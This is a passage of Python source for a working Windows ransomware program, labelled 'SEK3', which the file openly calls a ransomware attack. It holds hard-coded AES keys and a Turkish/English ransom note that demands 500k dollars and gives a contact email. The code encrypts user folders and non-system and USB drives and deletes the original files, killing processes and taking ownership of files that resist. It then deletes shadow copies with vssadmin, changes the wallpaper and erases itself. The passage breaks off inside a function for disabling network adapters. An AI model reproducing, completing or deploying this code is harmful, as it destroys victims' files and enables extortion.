    b'da3027cedbe5efa6fd008e4e2c1556fe',
    b'dd25287d55380bd882a05d83e3fe5722',
    b'b17205eb2fd2ddb331b498af51a837b5',
    b'a4580b6d4ae300daddd2e3ed986cb598',
    b'dd1a8cf98c75625a4dd97d20b9bb84f8',
    b'838e1ec562954e52dcc7b03aa37ead7e',
    b'8bd682e3ff50a65cc86cda5f1762a7ac',
    b'bc60a795e4a876c6585e3eeba139f183',
    b'd4e693a0de9228941c17e3bbb416b59a',
    b'c6048154ee537d202278300e510be2c1',
    b'1d20edf292422205c628abc6b100f286',
    b'add518b694c573816709feaa0ba56201',
    b'2ae0d04c04c56b7f5b1a6a9bb1aeb63e',
    b'c026f9aca1de91c9c4f043ccdc28b3be',
    b'cb58e0f5cd4b9e6230ff087cd3fda476',
    b'29e4caf8fe848e18dd19bf77d04140ac',
    b'49b9fb538fffc62cd07e3e0d203913ca',
    b'5401da048bfc0f59bc5eb0ed3afa8e40',
    b'a780d03e0c89b44b1b3472277b859ad7',
    b'0f55a1ce70ee2c58b3904cefa947b6db',
    b'7cb5585a6f53001cdbf8067a4cf7e568',
    b'7868f1c25c47931d126a9a6e2df4eb35',
    b'357a199148cf8ff16cc402c11e64f0fe',
    b'eb8bfee49155243dfd06421f6a07bdd8',
    b'9d288a50499863f7aeb4638a4395c582',
    b'2de2e027f64d3fa204c7c11403c3a738',
    b'5db890473ee91590125287a45bdf1360',
    b'b83089b11c5377375f904cf1253b408d',
    b'b035f3d78f83dceaa1998cf8aef6d4dd',
    b'6497f41812981942172a67f13acfee4f',
    b'38f1861e389114eb893c8b90e9608ecb',
    b'bb43e50f6d3f12ec392e8c73e4b37b20',
    b'9378ca02674f2fe3ef5bdbe65f9b40c6',
    b'86e9b1c4b881e5b8d2bcc2266caa61fc',
    b'dcc5211232a4e9274e5e7c26ce8a5ed1',
    b'163187e82597ae49e64d066d64d82e2c',
    b'73f3a26d394249cbf30f6d6734086d52',
    b'7ab5f58ff85ec7d9d98749043cfc0766',
    b'3035cf401c97469c57ccff6962636bdd',
    b'01cefe74f0981ee49810f8fed820b396',
    b'512df410d1e2cd50db465db6084d063f',
    b'8feb4920252006a45af885a2470dc298',
    b'578c9c81be385280cb6d3479be4aa914',
    b'a46f43f257a7e4a2d3177ad7b0847509',
    b'03e73741aeecfcfb01f46bf01db4a156',
    b'5f179c41952dcc6b791bf10763906d2a',
    b'0fc69cd779a2e462896a4664b7e24a9a',
    b'c5720dfca974f8155b55d936b8f2bc0b',
    b'e2411175d7bec88816a3c30419ffb928',
    b'820b3cd234b092c5a9d561d55249cb09',
    b'f6d0df742ec4af2564a9584120fe1c33',
    b'c1c692ca2af09a3cba7f31a6079487be',
    b'ae716e3ba91848a27794a8ad7a4e3c93',
    b'62435750de98061b6a5e7ce4ee2e6796',
    b'41ed4bf06b387967322b295f510c702c',
    b'd4a9baeaeeaae526976c0261e705611d',
    b'fe8a1e7f9885447b600b29615794fcd2',
    b'742dec88936c23a056cde206cb803f8e',
    b'adb69bd30d44f50ae7c4ffa5130386f9',
    b'f6d9fc04fdf2cbc1d9ae3e869a5429f7',
    b'65bc01b445122c9fd6db2a32974634d3',
    b'98d8b14f87adbf768053c6fc348b017e',
    b'82bb1a0133d335a3f1ea25f3dac76f4a',
    b'0c6fb14e21e2ee16e4a4a02b435ff91b',
    b'd28626485b18144ad2b26e1f403ea63a',
    b'347e051a2e0f681b4afc3927bc12fae5',
    b'471f89dd86130ccca45d3aa64baa4203',
    b'f2ffc592056af2a7062f789076564244',
    b'd0826e6013534e57be41dc6dd01c2243',
    b'd3d3e5025ee824144d01143663eef8f5',
    b'e198635b6eacd9ef1c3cd269a85bdb15',
    b'fc0f7e624fef4abed31d77ecea043a9e',
    b'92f7e965699cff9f30154bf4f7d5adf3',
    b'785caaa79e8ab8b3beb460c858c826d1',
    b'401235c7f22ed7ced78f9b78feb06a22',
    b'd839591a270c5db1cf4bf551bde95bc7',
    b'26f513b1031e286f0bab4d65e123c30a',
    b'42430f4a053eaeacee95e52cd66a6243',
    b'ca7585a36ac41670a76f6a6523fd95cd',
    b'91c2d87dfea11d9eb474775244f09aa7',
    b'23fbb34c2108cae4590901c90a440130',
    b'471cff5ad7fff53168da3cb805a6e98f',
    b'9bf001bd514a6044f004bb455516c6c7',
    b'99dd05bbd9ed18bdd35cad4d7773fb37',
    b'7a80e4b2aeed8a67d1bc86dd656f9981',
    b'381ab38690f620d01b4c26fa53b4458c',
    b'5ffc6013ef29ae5feaaea5e7c03b5968',
    b'61164bc64437b1cec23149bed1ef5009',
    b'2271681a90614e3a6065520a421f5c40',
    b'1622a041269026b9753b5fe1c0c63663',
    b'7fb4868d83826f9bbbe2f5213e2ce773',
    b'2d14f1857c72cb804e91d974a2f8b625',
    b'3e9cf1fcd5f26a395215d7a9c7baec46',
    b'bebee6184e0e260ff3396dd62cb1adc4',
    b'bf676722aa08fc1bd4af289513642014',
    b'e0e9ef90c6d11c47ce86afe5b2d45530',
    b'ea44c6f0d2bd756288eae171da24c5e8',
    b'34bc23a41bd3a52a86143444d4d8afa8',
    b'a822df16c5c1c98a4a43f348387173cf',
    b'bdacc2e4ff607c145108ce4b0c5561f2',
    b'bc165e1913d6e4028b4a62c09d51c4cf',
    b'7e7aa05279fa93e6f2a577362c94e770',
    b'b285a6867fc06764584e0a71b79bd617',
    b'b0afb89a4ea48f2ca668be1c8fd5cac2',
    b'c950f017bcd450b505b224bd31d60d3a',
    b'0f04ac7165466fd8a0868d4237a50938',
    b'b86d11f17110082387a88759bbffd77b',
    b'1382a8f57027fcd5ad24637586e5b982',
    b'd7f266b649ae64dfd53877dd71698731',
    b'2f5f0bc51c6d3929661035692132989e',
    b'c4b158636bdf32be817620fbc1ad67d2',
    b'3fa94d7d145b51553be10774baeb0505',
    b'2dbd18a576a9efc97cbb1c6a0716622a',
    b'a686d640a388bace97c33df073140946',
    b'c8de6174345775978350386776142713',
    b'5927e10d01b91d0ea08e136384c5a277',
    b'260aa1906cd707176711808f6e13477a',
    b'c5e52cd840ac5d5d35121fd6b7bfa162',
    b'697bab4d513d59304199cdf025c2f162',
    b'a2326abc04ab93f556cd5845054e35da',
    b'a71fd437617443064d89a9417d110c95',
    b'f308b09b5c84fa3e6c3d454200105ef4',
    b'f68f971cf95b74d6bb36bb0449a2fb39',
    b'381daf1d6ba283819d1e9934ba883d26',
    b'7650e19cd7e7d7dccf2ec3f93efb54bf',
    b'25b52c5c7b30922308c8238942555127',
    b'dc9e26f49120262e6d80d7aecbef1fa8',
    b'06b52a46fb339ca1e4384cc613448cc6',
    b'7bbad9c2a4a59667fe977b92649058c2',
    b'e68a2e4b4dd0d95d4fd822492ead2233',
    b'48ab6b568eb36cf0f11311cd38cf6ad5',
    b'639fff82ea9c87aea7898c29e388707b',
    b'43e448a4c885d1a32aca2bb0ee10bd2e',
    b'9db99ab56d3ca375343a29ba98b2778e',
    b'7ef87e6a6282ed1834dcac2aae2f01d1',
    b'c27250a61677987e25ad93926b1a6c21',
    b'fc4bdd8765c1a2492954bdc65c09a339',
    b'c55136c7ea37278e6db8531f4b2824d3',
    b'dd5b557676251b9691bd8141b9170f46',
    b'102e4b3f4ef1f343bc6d4065742431d6',
    b'b66f7e42e758ac7027715f8c40608538',
    b'd4a406976b89bb0b5832a370307bc31d',
    b'7b48c7bb684c1341da1e6fdf470affcd',
    b'8dd30032bd81aa1e87735905f3a58d4d',
    b'42235e34c6a7e6fc5eadadbe3c60511a',
    b'586bef5cd5fc9e4c733923ed35ebe590',
    b'4f93558d733bffe85ce602cec2031ae9',
    b'6dcbecc33a8d226dfd20c56be1197949',
    b'31c92b20ba9328c9283fecb8d60be96b',
    b'05f79cd5f4e0c5b692681ff4648097b6',
    b'dd9ed52791bca410645515eb66994e0d',
    b'92a6d75cc9859eacb0bf799980717f47',
    b'43faa06e2d9f54a6df7b2bf984c037b8',
    b'e887e8e854ee0c98d61c18efb33e47c2',
    b'56864db6e8955df9ff86867ea2c9744e',
    b'782e1371ea6ed20846fb6098f07d6107',
    b'72a8083b4445226a84ce3b3ca7aff542',
    b'e749c67287fa1e94987f1fad42150466',
    b'4968add44dd322d6443497224e8ce7a2',
    b'7528bc583817807ad672f1ee114c4d31',
    b'15da841ed6e76178e974e1259c0b2208',
    b'ebf70c27e6b9919f68a9a5c6683b0f52',
    b'9ae97e64089a8c5f6b48ac94c0791116',
    b'c6b7ecfebcb892a0e890d98064aa819e',
    b'997175e6ad8415d44a002ff1a5df1563',
    b'7173b783807830cb53139e2e4bc9404e',
    b'e386d4f0c3009ea96af055e8f0426c9f',
    b'cb347a7b1dec51a5b55ead8822f12146',
    b'eaa54d6249777a0895453043bff97095',
    b'0df9eb0ae879c05a19e6f4d6b2b95cb6',
    b'0cf5fd702b670f9945a0ac6cee3a197d',
    b'0be4f834bf1b5835be25a9c1918bf58d',
    b'9b5005302981c84d57f2ba1c245363b2',
    b'836280bf48d25452d78ee5d8e6f5b9a8',
    b'13aaa1bc91bd7470625e71c1b219da1f',
    b'bec74ca935a7cdca3b0a4be6bd4e57a4',
    b'0653ba4989d7c34c1f82d834d265af50',
    b'c76bdd4417b7da7a953d65592b460023',
    b'638e238a154380d31fec62de36126777',
    b'3d31d0a8252d5d1f34d0b25ac9fd6433',
    b'2273c5f82eb5978c81f650fc343e44df',
    b'63e803db805e385267fabbe11269bb8f',
    b'898c2ecf0ff2a1bd28a5090166fc154e',
    b'95f99c0db95ba52b6978db7074daac1a',
    b'da482bbd3a8da33bb90ffdf84128a8ff',
    b'5b458ddfa42785e1487b0305c86dee89',
    b'9c4b0ba2a5cdf4d3fe7609f0e850c7e6',
    b'bbbd0078e96c92a4937640da4f6c8807',
    b'a8c01cc6f2f6ca53ab67d262db1d5f73',
    b'cc15d0f5ccccc19bd7115ca9c9e84e8a',
    b'f9a60d6093550a6cb8d3aca58b6124f8',
    b'307956fd1cc1f82a9394ba62c0f01e1c',
    b'f8b92ffbff932955c9e2f09bb4a88632',
    b'76432bb22555d434158ecde1d780b653',
    b'7ef26865b6c6b94fc10554ce15a00d5c',
    b'da7ac1ae4da32bd2b78fd43029d78cbf',
    b'e7a122a80a79194c0332e8c85c21a13f',
    b'52319542d0356d8885c5b75d6efa7160',
    b'60bd3e8ae60cd419d4a46adccfd70681',
    b'ea936d3b271934a098f3e4897f07b412',
    b'3edfebdd8118d4627688e1933c30566c',
    b'33ee9e723e4a8bf7371db302975523b7',
    b'fd88851e4d8651804603e095cc392b87',
    b'fa1d769c19984906abc7ff9afcc2a4bf',
    b'b6cdafa59495a8bb76dca04d3c3cc8a2',
    b'3b4c1aa548a3fe5c0198fd3cbf7604e6',
    b'8a194d71ee6b0108e50f82b759a66552',
    b'1bc4c76177360d64b2002cad71bfa994',
    b'68e5218ebc222969247bce3e96b50548',
    b'e30413f46e51f6ed250482df2a2cd0b1',
    b'5fc6b6a894b54a270a08e48c19425a6e',
    b'8c2d616c2c1eb0e4984638b9ff50c182',
    b'5dc24b8e2543fd669468381cc677031e',
    b'7109eb01732714b634cca353e1095392',
    b'ee0c0dab2e7caacc54b36f7217509e9d',
    b'8f2aa362eefdfca01ccd374b866b119e',
    b'05b626b855b0eb6d074b13c37da1a5d2',
    b'ae60e613f9313c6e0e18a0c114ae77a1',
    b'8cee12d34ed44c1053e970135842b54b',
    b'ad23dbdca5367c451c60a348cd2a36b2',
    b'547e5d12f88c02cfa58e3a0e3b676bbc',
    b'c4b4724fb0b98b0fb87afa13b4f0fc3a',
    b'6def983b5d41c01600324b3efcc5f0e8',
    b'087a9a3663b576a8e4e218e6d0dfcc53',
    b'a830f037c533ff50b955509cf177723f',
    b'3d2f1c4ffc0565ec7bac91d45e3e962d',
    b'1ca9566ab8042c4a47c5a6a2deecf6c4',
    b'e08f86606158266e3df8d149ce8ab7fb',
    b'22b317779b6767c190b35490ced68498',
    b'6554335ad2121a2094cdb85d6a8b44bd',
    b'60bab167b7e4f6e2c9b6b6c82431e2bc',
    b'e2eebb705db573d86b4207c197adcbbe',
    b'f6ee03e497045ecef23c94436908a6e4',
    b'8f4760aa4a00abe06f3e5840b1d446ac',
    b'952b197f0e503e284905ed65b05d7285',
    b'd450fa8e09faba5f8a2c09e9d577083c',
    b'b81b063116463190c34eeb89875fc4cc',
    b'cfca86fc5c396b33c84512bfd2c92b1e',
    b'a55d8f1390cecff24b110da1c45e84bd',
    b'a2da03da776277ead7bf6e08e8997289',
    b'7b13b51bbedf792ccf3aedda4f10f828',
    b'438118ccbd32b882c4c34672bfbcf7de',
    b'd6ddd6d3d444f9381d4664c46015acaf',
    b'3c5b5cf758f8cf436367683f5e252fd6',
    b'25c3d1aa03180468ba355b8ec45c5114',
    b'2a20f3476c80cfae3a7db04897d27bdc',
    b'874000a90da771434ea30858587f06a5',
    b'18a47390af24d60fc7a1cf86cbd4cbd3',
    b'c2c3d13f90d3dd6d42b22da1c0dc4dbe',
    b'a80048b5bc47cb9dbb9701f1a4cf74b0',
    b'58f316d135b456bf74de451066aabfa9',
    b'ccdb920aec613295e385f68a7038f856',
    b'fe4304e6d952ba80d6aab30e72e7bac9',
    b'5338f586f7a37dfc300e0320fd756d61',
    b'36428840aa59b69fa36edb6e610b0c24',
    b'a703d013053d4c0e619cbdb502f7e89b',
    b'290dc572efa9f118138e87d4231d9299',
    b'b01094a92185b0f8b1cb066530151a7e',
    b'3fee9bd589a82688d8b1c09c114c021f',
    b'15cb4c8ad1e78b571df56fafe55901c6',
    b'716fa5a78df5816c4fc9ddfe61902d7c',
    b'a889a7788a06a10c208c9bf43653f6d2',
    b'f117c96fba615448c871b71f6038a675',
    b'113dc85842a57966e887a9bcc03bdb9b',
    b'0edfe5f7f2158685e92bb12d97e0d097',
    b'1942824950651d8a6eb2233061d41eaa',
    b'470ce5b3b4d66533b93443dc1116961b',
    b'0c4c94dcfdd7f74bfeb007ea15873119',
    b'16649f61f88cd2d1e3317255c19a9946',
    b'2c31e7680e9b5875e7891428834c9113',
    b'a2709167efef63c8c27b093fb8b56857',
    b'409a35329aac72d8f104a8e6a760649b',
    b'0a89879db9b80498079334f3f8fd836c',
    b'ae37f514d57958aba1007c090fdda61f',
    b'e46ffc9d3eacafd0c325393b359e1864',
    b'20c1d5061f1187e4327c6afbfaddd0d4',
    b'5163ef8c27892ea1d9e56babcbd68127',
    b'fec5a5b95208e1144c74e3082eab9f60',
    b'03efe34ba085fb063e3e72349c0ff2aa',
    b'3442116925c019781bf3b4554e4a1635',
    b'f260511d817d3c52a45b2a54be2e00bb',
    b'529b384545655e1e6244031b62f2dd95',
    b'41a28cdaf427dfbc3d24779fa8d5f0f6',
    b'9bb4eb5459c03dd84ca152784188916a',
    b'f715f5dbb21a235077cbec8412919b39',
    b'35869e0f2518b8016ae00f0e4c93fe71',
    b'5750a0123f2d3b28853a908165edc860',
    b'b489fa7e84d59f1ce0bccd4ccf068d45',
    b'e487c9bf5675346b3c7f07523ba16f5d',
    b'b5f1b0f06453aa3299fa45e0a825c68f',
    b'c630ead476756ae0827d070b788cf58b',
    b'285d49e43a2ff45afa1aacd326c8103b',
    b'95c41b39af99b91c405de70e29116e41',
    b'9e73db73ea3cac47880f4c44078bd023',
    b'16b7be5b501601a933466d1b33565d72',
    b'e9ca6ceac1bfbcf4afa562a351e42ae9',
    b'd4a1d50a3f2d87971e10eda46cefbcea',
    b'ed13679234cc2e07232005cc82bfd2d8',
    b'fde19a038292e65a54fc5f78cada5648',
    b'f34a215ab1eac4abf1b8b43b4c9743bc',
    b'ac4f6b3b6e9ac3c736d86ef9cc3bf8dc',
    b'644bdd389e0040c339c3c7cef8b73f21',
    b'c75e93a481763f5e869cf5776a533712',
    b'1e79525076de5c0b83d43433e08992d1',
    b'99e231eea9013f16d3d6c2d709a05e09',
    b'af8c319eee8959e94e60317fc3088579',
    b'fc54ace8cad4b83d4deeff1e64862a7a',
    b'44730d1db17219ba5f17a50599988385',
    b'ef243203e3a87d942fb0217d91f16eb8',
    b'92acf0d7972df6974d3f362d905faa91',
    b'2197d5bc731c97ec5f41998b5250b925',
    b'94f008ab1779912c6abb730973263622',
    b'14efdf7144d61e099c4dffa1cc1535e5',
    b'cde5a682739742f52685c0b2af476a5c',
    b'66e68dd7e9f7e774762c403d95944363',
    b'395912f700627befd94c33b51b9a6559',
    b'71872f99ed40683915e546f63363a2ab',
    b'5b42d6dc5f71611bced52e6e1456fa37',
    b'06aca031b889f77d503cebb9f6e032ee',
    b'3f50e60ff07468dff7c4398079ffcf08',
    b'e5b12835c5b810f7e4d84cab9ea00334',
    b'2dd0972d1f78d3c39400355caf9ea087',
    b'195e842cfacd3203dc8d3114110a470c',
    b'931946b0d10054e4f89e27a29ea7a416',
    b'161ad17eafa64b9fb012ca2c3f15cb31',
    b'684b5de5c75bae95fc78132e86be3ecc',
    b'dfbfb9ccef392c8fea0eee827cfd8aef',
    b'01e603ba14707973a575eb792824192d',
    b'0c4b7a9b076c081dcb63688b9affaef8',
    b'3a39191c3fa069f682503b2629a178f7',
    b'6f1fb4ba6921ccfb2b5774bbb101f44b',
    b'd79ee7cc778865b6d110f9e7faee65fd',
    b'0890e18c8238ca7e45ce4b9ad62a0776',
    b'852855b9bfdec093c7910a5f20535bbd',
    b'e5b012db3345ce8c11c5fd2895d2893e',
    b'7f3be62670ad68df31bc9aeb2d0a7bc4',
    b'7795234236f730ef18cf3a381bcbb8fe',
    b'8f41ca86f0690e838f45226ac570f429',
    b'7fcae3eefd4869f3176cb4bd4d72aedf',
    b'c137e45f919d786b363dc180edc9266a',
    b'86e680234b23cc920fdf8eb346191ca1',
    b'5aa64d7e4ffd56e12a92066818937fea',
    b'2174cc6e602f8d90ca4facd07e5fba97',
    b'93d8ccc4581ab61ffeb0c15716c9f035',
    b'b06eb943b5379bd0b13de52b48c59ab4',
    b'6797692122053b53c9b81cbbc748c407',
    b'bb1a93482b6a0b44d26f2758b17c94fc',
    b'ed83aed7c4b5e8f1617711978004efd5',
    b'b9d15f40a9345f144cb22c85f0651a3e',
    b'17f6df65b9b12828e9f89d847b6161cc',
    b'300dc5a46da9c6c35d03575734382235',
    b'7d5ea1c94a1ee3c76140cc4bc11ee367',
    b'105290c3fb1efd411e8258c80ec052d5',
    b'c2e42ae6afba543aa9bf9dc3674a32a3',
    b'688298a1e900800274f0682737a143f2',
    b'c11aa3ebaa6a1056ec51cc3d3991153e',
    b'9083c1c1bea4a1f756574a9f872a1235',
    b'7c999ef93ca9b2a8c73eaa89542a2bf8',
    b'246826260e67ccba359433925ffad9ba',
    b'16be67443ce559a074130f8eb7db36a7',
    b'9dca66f235210164bc2b45e6e4487c1b',
    b'fe34c518b6783f30d38f8dc03d0dbcbb',
    b'3427370008794bc3ed67c96eab462e7c',
    b'a3ad80d1f4b3f61b5f3bd5f85eca75f8',
    b'fc9efcccea922d1d76bacea61a131a77',
    b'ebd5e18067a5cd0ebe665f1f47e4b295',
    b'fcf6d8282ed2b6a223fe2133ff183988',
    b'5f654b1b4aa3ee857f4ba0ec56800c63',
    b'65fb6d093cec663168837bf69dbb1587',
    b'23ee37aaf85da1d97378929189fc6d46',
    b'3568d401f5341114ca7312a984e159b9',
    b'7fc3382c7a65725a702ed7a1514865f6',
    b'62e305e6e19d243f153d4214e22951f2',
    b'd97c86b49a2ea75545b83060a052b768',
    b'8d26f21372ccc2024e273e4002a53e55',
    b'3b49b953c7da88a5d4cb6645d058ac7a',
    b'097733faadac7cff0b975647be867429',
    b'e8aa6e52ad2625e4e3d20e8e8f09ccd6',
    b'f0f76f2b0e467ab98b84433cfddfdd4a',
    b'477d675fb06219a2004bcb5a56ceba06',
    b'ddb0c385ff882d3c84850c6ab8b455da',
    b'fb3697504fe4f0ce2fef5ea0519b547e',
    b'56e1f289ca85607c8a84f8a42553d521',
    b'd65a03a8d2f7f99b84524c7a419d028d',
    b'65ef0a54c9b26d917515d5b77ce34c3d',
    b'38856e3013ac3f0acbbe71e9af7fb725',
    b'bfdcc8e252f76d5f511746ef9c76902a',
    b'd3f398074f8054f4e2c2a4fc80dd9b99',
    b'301b52703a57f03860199bbaf3d374c1',
    b'3daa26b25f04669ae377799c9f8c189b',
    b'59c2fd3c2d37f1b4114ab89461a072fb',
    b'c78a1f36191b508326329fe0825cb332',
    b'9b71f23e5bb2170383b5f19a24bcebc5',
    b'63e302f1c013bdab9c46c666e8eedea5',
    b'6335b146c7f4e98ce24a9c111cd79812',
    b'd3d08b551a0fd98811f8a3b60724337d',
    b'124127ea186a9bca129c165fe35ac65c',
    b'b58e8794beeaa2bff21bb207c5504cae',
    b'38417111eac5d2635038241e34fe227c',
    b'd386838afe21eaaad0db253fbd136a54',
    b'78b51e209b420f68e0fccb1dd405a4d0',
    b'b84cf4eec4a1de05dc8dcda5840d5da9',
    b'6b182f35264c0ec370611fd5d78abc57',
    b'40fd6c689f7e034e6065e7e6e6468b12',
    b'a77a64832968096452461bfd51d19d49',
    b'df9de7c90ebab51930b9764d202d2d98',
    b'a9fd18aa5fddad8880053c5b0770a61a',
    b'8c5865535580a3465cb473fdad782084',
    b'0e8bba9e2d61e197ca361455aa5fae8b',
    b'0d97d2a8269c8fc35395be42c0b246eb',
    b'39d6d95313594e0eea00102a5ecdfe5c',
    b'e92050ad1c61a5275cc219df3d9a7ada',
    b'ab54f90cf65fc62946e5ddae6232ea76',
    b'31b44d930e00ccbfbafc9784bb12b47d',
    b'88df733a95df63553be44fa71c6b1be8',
    b'60203ab8a3f3345fe62d8b331f352f3a',
    b'a36bcb824b59ee3a166f2f2dc8c43d89',
    b'25c887f44d20a3bed6395faf1e5e5ded',
    b'bd4472a32bffab866bba959a62bb7898',
    b'eefe293c0efc971ee9e7cd70ec73e660',
    b'14b1de5ad60e50d8838364e71e34302b',
    b'07dee0aeae6e50f84e095b1720144cb9',
    b'76e022fc0d139160019f48de8507b71a',
    b'01f62255cdb16def36d3c484e6d9f79a',
    b'85ca8e274173863e3ec87ca36444695d',
    b'ca77eee563e37ff5d23f131503cd8686',
    b'03b5be42c8b34847947884db709371a1',
    b'682a10e21cf1e6678440aec163746f52',
    b'fbcded55010756f01dc3e4a966431e06',
]

note_content = ("Yuziak  i\xe7in \u00F6zel tasarlanm\u0131\u015F vir\u00FCst\u00FCr. Bu vir\u00FCs\u00FC almak i\xe7in l\xfctfen bana ula\u015F\u0131n\u0131z.\n\n"
                "Personal ID: {},\n\n"
                "You must pay 500k Dolars Yakla\u015F\u0131k 30 g\xfcn\xfcm gitti ve daha yeni bir y\u0131la girdim kodlama deneyiminde.\n\n"
                "Bana protonkral5668@proton.me adresinden ula\u015Fabilirsiniz, b\xf6ylece dosyalar\u0131n\u0131z\u0131 \xE7\xf6zebilirim ve bedavaya, evet bedava.\n\n"
                "Sak\u0131n personel kimli\u011Fini silme ve sildiysen C:\\ klas\xf6r\xfcne bak - Anar\u015Fist PanOS"
)

def get_logical_drives_powershell():
    try:
        command = "Get-Volume | Select-Object -ExpandProperty DriveLetter"
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        drives = [drive.strip() for drive in result.stdout.split('\n') if drive.strip()]
        
        usb_command = "Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | Get-WmiObject -Class Win32_DiskPartition | Get-WmiObject -Class Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID"
        usb_result = subprocess.run(["powershell", "-Command", usb_command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        usb_drives = [drive.strip() for drive in usb_result.stdout.split('\n') if drive.strip()]
        
        return drives + usb_drives
    except Exception:
           pass

def run_powershell_command(command):
    try:
        process = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        result = process.communicate()[0]
    except Exception:
           pass

class AnarchyLogoWidget(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.create_widgets()

    def create_widgets(self):
        self.anarchy_label = tk.Label(self, text="SEK3", font=("Arial", 30, "bold"), fg="grey")
        self.anarchy_label.pack(expand=True, fill=tk.BOTH)

class RansomwareApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Ransomware attack delivered")
        self.geometry("500x400")

        self.personal_id = self.get_personal_id()

        if self.personal_id:
            self.modify_aes_keys()
            self.encrypt_user_folders()
            self.remove_shadow_copies()
            self.display_alert()
            self.anarchy_logo_widget = AnarchyLogoWidget(self)
            self.anarchy_logo_widget.pack(expand=True, fill=tk.BOTH)
            source_file = os.path.join(os.path.dirname(__file__), 'SEK3.png')
            if not os.path.exists(source_file):
             source_file = os.path.join(os.path.dirname(sys.executable), 'SEK3.png')
            threading.Thread(target=set_wallpaper, args=(os.path.abspath(source_file),)).start()   
    def get_personal_id(self):
        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        personal_id_file = os.path.join(system_drive, "YOUR_SECRET_PERSONAL_ID.txt")
        if os.path.exists(personal_id_file):
            with open(personal_id_file, 'r') as f:
                return f.read().strip()
        else:
            aes_key_index = int(get_random_bytes(1).hex(), 16) % 999  # Generate a random index
            personal_id = self.generate_personal_id(AES_KEYS[aes_key_index], aes_key_index)
            try:
                with open(personal_id_file, 'w') as f:
                    f.write(personal_id)
                return personal_id
            except Exception:
                return None

    def generate_personal_id(self, aes_key, aes_key_index):
        try:
            aes_key_index_str = str(aes_key_index + 1).zfill(3) if aes_key_index < 99 else str(aes_key_index + 1)
            
            random_hex = get_random_bytes(30).hex()
            personal_id_suffix = random_hex[:60]
            
            personal_id = aes_key_index_str + personal_id_suffix
            
            return personal_id
        except Exception:
            return None

    def modify_aes_keys(self):
        if not self.personal_id:
            return

        personal_suffix = self.personal_id[-4:].encode()
        for i in range(len(AES_KEYS)):
            AES_KEYS[i] = AES_KEYS[i][:-4] + personal_suffix

    def encrypt_file(self, key, in_filename, out_filename=None, chunksize=64 * 1024):
        if not out_filename:
            out_filename = in_filename + '.SEK3'

        if in_filename.endswith('.SEK3') or os.path.basename(in_filename) in ['README.txt', 'YOUR_SECRET_PERSONAL_ID.txt']:
            return False

        iv = Crypto.Random.new().read(AES.block_size)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        
        infile = None
        outfile = None

        try:
            filesize = os.path.getsize(in_filename)
            infile = open(in_filename, 'rb')
            outfile = open(out_filename, 'wb')
            
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if not chunk:
                    break
                if len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

            infile.close()
            outfile.close()

            try:
                os.remove(in_filename)
            except Exception:
                pass
                try:
                    for proc in psutil.process_iter(['pid', 'name']):
                        if in_filename.lower() in proc.info['name'].lower():
                            subprocess.run(['taskkill', '/F', '/IM', proc.info['name']], creationflags=subprocess.CREATE_NO_WINDOW)
                    subprocess.run(['takeown', '/f', in_filename], creationflags=subprocess.CREATE_NO_WINDOW)
                    subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{in_filename}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception:
                    pass

            return True
        except Exception:
            return False

    def encrypt_folder(self, folder_path, aes_key):
      try:
        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        
        if folder_path == system_drive:
            return
        
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(aes_key, file_path)
        if self.personal_id:
            readme_file_path = os.path.join(folder_path, "README.txt")
            with open(readme_file_path, 'w') as readme_file:
                readme_file.write(note_content.format(self.personal_id))
      except Exception:
       pass
    
    def encrypt_user_folders(self):
     try:
        if not self.personal_id:
            return

        aes_key_index = int(self.personal_id[:3])
        aes_key = AES_KEYS[aes_key_index - 1]

        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        drives = get_logical_drives_powershell()

        non_system_drives = [drive for drive in drives if drive != system_drive]

        download_dir = userpaths.get_downloads() or os.path.join(os.path.expanduser('~'), "İndirilenler")
        documents_dir = userpaths.get_my_documents()
        desktop_dir = userpaths.get_desktop()
        pictures_dir = userpaths.get_my_pictures()
        music_dir = userpaths.get_my_music()
        videos_dir = userpaths.get_my_videos()

        user_folders = [download_dir, documents_dir, desktop_dir, pictures_dir, music_dir, videos_dir]

        for folder in user_folders:
            self.encrypt_folder(folder, aes_key)
    
        for drive in non_system_drives:
            self.encrypt_folder(drive, aes_key)
     except Exception:
           pass

    def display_alert(self):
        try:
            personal_id = self.personal_id
            if personal_id:
                intro_text = note_content.format(personal_id).split('\n')

                for line in intro_text:
                    label = tk.Label(self, text=line)
                    label.pack()
        except Exception:
           pass
    def remove_shadow_copies(self):
        try:
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
           pass
    def closeEvent(self, event):
      try:
        os.remove(__file__)
        os.remove(sys.executable)
        event.accept()
      except Exception:
        try:
            subprocess.run(['takeown', '/f', __file__], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{__file__}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['takeown', '/f', sys.executable], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{sys.executable}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
            event.accept()
        except Exception:
            pass

def disable_all_network_adapters():
    try:
